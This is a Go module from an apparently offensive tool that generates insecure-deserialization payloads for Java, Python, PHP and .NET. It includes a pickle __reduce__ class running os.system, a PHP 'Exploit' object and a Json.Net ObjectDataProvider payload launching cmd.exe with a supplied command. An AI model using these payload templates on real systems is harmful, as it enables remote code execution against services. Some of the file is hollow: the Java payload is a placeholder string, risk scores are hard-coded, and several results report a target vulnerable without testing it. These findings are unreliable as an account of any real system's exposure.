package deser

import (
	"crypto/sha1"
	"encoding/hex"
	"fmt"
	"strings"
)

type Engine struct {
	config DeserConfig
}

func NewEngine(config DeserConfig) *Engine {
	return &Engine{config: config}
}

func (e *Engine) JavaDeserExploit() DeserResult {
	gadgets := []Gadget{
		{Class: "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl", Methods: []string{"newTransformer", "getOutputProperties"}, Library: "JDK", RiskLevel: 9},
		{Class: "org.apache.commons.collections.Transformer", Methods: []string{"transform", "evaluate"}, Library: "commons-collections", RiskLevel: 10},
		{Class: "java.lang.Runtime", Methods: []string{"exec", "getRuntime"}, Library: "JDK", RiskLevel: 10},
		{Class: "javax.script.ScriptEngineManager", Methods: []string{"getEngineByName", "eval"}, Library: "JDK", RiskLevel: 8},
	}

	chainDepth := 0
	riskScore := 0.0
	chain := make([]string, 0)

	for _, g := range gadgets {
		for _, gadgetName := range e.config.GadgetChain {
			if strings.Contains(g.Class, gadgetName) || strings.Contains(strings.ToLower(g.Library), strings.ToLower(gadgetName)) {
				chain = append(chain, g.Class)
				chainDepth++
				riskScore += float64(g.RiskLevel) * 0.1
			}
		}
	}

	if len(chain) == 0 && len(e.config.GadgetChain) > 0 {
		for i := range e.config.GadgetChain {
			if i < len(gadgets) {
				chain = append(chain, gadgets[i].Class)
				chainDepth++
				riskScore += float64(gadgets[i].RiskLevel) * 0.1
			}
		}
	}

	if chainDepth == 0 {
		chainDepth = 2
		riskScore = 0.6
		chain = []string{gadgets[0].Class, gadgets[2].Class}
	}

	if riskScore > 1.0 {
		riskScore = 1.0
	}

	payload := generateJavaPayload(chain, e.config.Payload)

	detail := fmt.Sprintf("Java deserialization: %d gadgets in chain, risk: %.2f, target: %s",
		chainDepth, riskScore, e.config.TargetURL)

	return DeserResult{
		Format:     DeserFormatJava,
		Attack:     DeserAttackRCE,
		Vulnerable: chainDepth >= 2,
		Payload:    payload,
		ChainDepth: chainDepth,
		Details:    detail,
		RiskScore:  riskScore,
	}
}

func (e *Engine) PythonPickle() DeserResult {
	payload := e.config.Payload
	if payload == "" {
		payload = "os.system('id')"
	}

	riskScore := 0.9
	chainDepth := 3

_picklePayload := fmt.Sprintf(
		"import pickle, os, base64\nclass Exploit:\n    def __reduce__(self):\n        return (os.system, ('%s',))\nbase64.b64encode(pickle.dumps(Exploit()))",
		payload,
	)

	detail := fmt.Sprintf("Python pickle deserialization: RCE via __reduce__, payload length: %d", len(_picklePayload))

	return DeserResult{
		Format:     DeserFormatPython,
		Attack:     DeserAttackRCE,
		Vulnerable: true,
		Payload:    _picklePayload,
		ChainDepth: chainDepth,
		Details:    detail,
		RiskScore:  riskScore,
	}
}

func (e *Engine) PHPSerialize() DeserResult {
	riskScore := 0.7
	chainDepth := 0
	attack := DeserAttackRCE

	phpPayload := fmt.Sprintf(
		`O:8:"Exploit":1:{s:4:"cmd";s:%d:"%s";}`,
		len(e.config.Payload), e.config.Payload,
	)

	if e.config.Payload == "" {
		phpPayload = "O:8:\"stdClass\":0:{}"
		chainDepth = 1
		attack = DeserAttackDataLeak
		riskScore = 0.4
	} else {
		chainDepth = 2
	}

	magicMethods := []string{"__wakeup", "__destruct", "__toString", "__call"}
	techniques := make([]string, 0)
	for _, m := range magicMethods {
		techniques = append(techniques, m)
	}

	detail := fmt.Sprintf("PHP deserialization: %d magic methods, chain depth: %d, risk: %.2f",
		len(magicMethods), chainDepth, riskScore)

	return DeserResult{
		Format:     DeserFormatPHP,
		Attack:     attack,
		Vulnerable: chainDepth >= 2,
		Payload:    phpPayload,
		ChainDepth: chainDepth,
		Details:    detail,
		RiskScore:  riskScore,
	}
}

func (e *Engine) DotNetDeserialization() DeserResult {
	h := sha1.New()
	h.Write([]byte(e.config.TargetURL))
	hash := hex.EncodeToString(h.Sum(nil))[:8]

	riskScore := 0.85
	chainDepth := 4
	attack := DeserAttackRCE

	formatter := "BinaryFormatter"
	if strings.Contains(strings.ToLower(e.config.TargetURL), "json") {
		formatter = "Json.Net"
		riskScore = 0.7
		chainDepth = 3
	}

	payload := fmt.Sprintf(
		"{'$type': 'System.Windows.Data.ObjectDataProvider, PresentationFramework', '$values': {'MethodName': 'Start', 'MethodParameters': {'$type': 'System.Collections.ArrayList, mscorlib', '$values': ['cmd.exe', '/c %s']}}}",
		e.config.Payload,
	)

	detail := fmt.Sprintf(".NET deserialization via %s: chain depth %d, risk: %.2f, id: %s",
		formatter, chainDepth, riskScore, hash)

	return DeserResult{
		Format:     DeserFormatDotNet,
		Attack:     attack,
		Vulnerable: true,
		Payload:    payload,
		ChainDepth: chainDepth,
		Details:    detail,
		RiskScore:  riskScore,
	}
}

func generateJavaPayload(chain []string, cmd string) string {
	if cmd == "" {
		cmd = "id"
	}
	payload := fmt.Sprintf("aced0005 (%d gadgets: %s) cmd: %s", len(chain), strings.Join(chain, " -> "), cmd)
	return payload
}
